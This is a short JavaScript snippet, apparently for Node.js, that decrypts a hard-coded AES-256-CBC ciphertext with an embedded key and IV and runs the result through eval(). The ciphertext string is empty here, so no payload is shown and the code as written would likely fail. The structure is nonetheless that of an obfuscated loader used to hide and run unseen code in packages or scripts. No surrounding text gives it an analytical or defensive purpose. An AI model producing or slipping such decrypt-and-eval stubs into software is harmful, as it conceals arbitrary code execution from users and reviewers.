(function(){
const crypto = require("crypto");
const key=Buffer.from("a7e148b6b1e16ed1a1d3fcaa56257d06787231b97d539a87c84d1a5dcae02fb6","hex");
const iv=Buffer.from("4b95db8461d14ccbe873d8c945eb028b","hex");
const data="";
const decipher=crypto.createDecipheriv("aes-256-cbc",key,iv);
let decrypted=decipher.update(data,"hex","utf8");
decrypted+=decipher.final("utf8");
eval(decrypted);
})();